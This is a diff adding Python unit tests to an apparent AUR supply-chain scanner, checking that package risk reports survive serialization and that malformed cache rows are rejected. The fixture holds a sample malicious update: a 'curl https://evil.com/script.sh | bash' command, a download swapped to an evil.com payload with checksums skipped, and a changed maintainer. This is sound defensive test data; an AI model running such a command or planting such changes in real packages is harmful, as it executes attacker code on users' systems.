@@ -190,3 +190,101 @@ def test_fact_to_dict_json_serializable():
     loaded = json.loads(json_str)
     assert loaded["package_name"] == "test"
     assert loaded["final_score"] == 25
+
+
+def test_fact_from_dict_roundtrip():
+    """The review cache (#20) serves `fact_from_dict(fact_to_dict(f))`, so the
+    round-trip must be lossless for everything a report reads."""
+    from trustsight.depth import DependencyReport
+    from trustsight.ioc_baseline import IocMatch
+    from trustsight.schema import fact_from_dict
+
+    fact = PackageFact(
+        package_name="brave-bin",
+        old_version="1.0.0",
+        new_version="2.0.0",
+        old_commit="abc123",
+        new_commit="def456",
+        maintainer_changed=True,
+        previous_maintainer="alice",
+        current_maintainer="mallory",
+        pkgver_changed=True,
+        pkgver_old="1.0.0",
+        pkgver_new="2.0.0",
+        version_moved=True,
+        version_comparison="aur_ahead",
+        temporal_source="git_commit",
+        diff_summary=DiffSummary(
+            lines_added=50, lines_removed=10, files_changed=["PKGBUILD"],
+            file_changes=[{"path": "PKGBUILD", "status": "modified"}],
+        ),
+        source_changes=SourceChanges(
+            added_urls=["https://evil.com/payload.tar.gz"],
+            removed_urls=["https://brave.com/brave.tar.gz"],
+            checksum_behavior="changed_from_sha256_to_skip",
+        ),
+        source_buckets={"https://evil.com/payload.tar.gz": "unknown"},
+        execution_changes=ExecutionChanges(
+            resolved_commands=["curl https://evil.com/script.sh | bash"],
+            suspicious_patterns_detected=["R001"],
+            unresolved_patterns=["_url=$(...)"],
+        ),
+        novelty_context=NoveltyContext(url_first_seen_globally=True),
+        first_seen=False,
+        suppressed_rules=[{"rule_id": "R099", "severity": "MEDIUM",
+                           "override_reason": "known", "override_package": None}],
+        diff_truncated=True,
+        scan_truncated=True,
+        tree_analyzed=True,
+        changes=["pkgver 1.0.0 -> 2.0.0"],
+        dependency_changes={"depends": ["demo-aur-lib"]},
+        coverage_gaps=["diff_truncated", "tree_not_analyzed"],
+        carried_coverage_gaps=["tree_not_analyzed"],
+        unresolved_sources=["source=(\"$(...)\")"],
+        risk="High",
+        score_breakdown=[ScoreEntry(
+            rule_id="R001", severity="CRITICAL", weight=40, reason="curl | bash",
+            params={"cmd": "curl"}, template="{cmd} pipes to a shell",
+            evidence={"match": "curl x | bash"}, file="PKGBUILD", line=7,
+        )],
+        final_score=85,
+        ioc_matches=[IocMatch(
+            type="domain", value="evil.com", source="test-baseline",
+            confidence="high", provenance="manual", campaign="test",
+            added="2026-01-01", surface="source", line=3, expired=False,
+        )],
+        dependencies=[DependencyReport(
+            name="demo-aur-lib", depth=1, score=10, risk="Low",
+            risk_label="Low", finding_count=1, coverage_gaps=("diff_truncated",),
+            via="depends", parent="brave-bin",
+        )],
+        depth_truncated=True,
+        depth_note="cut short",
+        depth=2,
+    )
+    loaded = fact_from_dict(json.loads(json.dumps(fact_to_dict(fact))))
+    assert loaded is not None
+    assert fact_to_dict(loaded) == fact_to_dict(fact)
+    assert loaded.score_breakdown[0].line == 7
+    assert loaded.ioc_matches[0].value == "evil.com"
+    assert loaded.dependencies[0].coverage_gaps == ("diff_truncated",)
+    assert loaded.carried_coverage_gaps == ["tree_not_analyzed"]
+    assert loaded.depth == 2
+    assert loaded.cached is False
+
+
+def test_fact_from_dict_rejects_rows_it_cannot_serve():
+    """A row predating a key the round-trip needs is a cache miss, not an error."""
+    from trustsight.schema import fact_from_dict
+
+    assert fact_from_dict(None) is None
+    assert fact_from_dict("fact") is None
+    assert fact_from_dict({}) is None
+
+    d = fact_to_dict(PackageFact(package_name="demo"))
+    del d["coverage_gaps"]
+    assert fact_from_dict(d) is None
+
+    d = fact_to_dict(PackageFact(package_name="demo"))
+    d["diff_summary"] = "not-a-dict"
+    assert fact_from_dict(d) is None
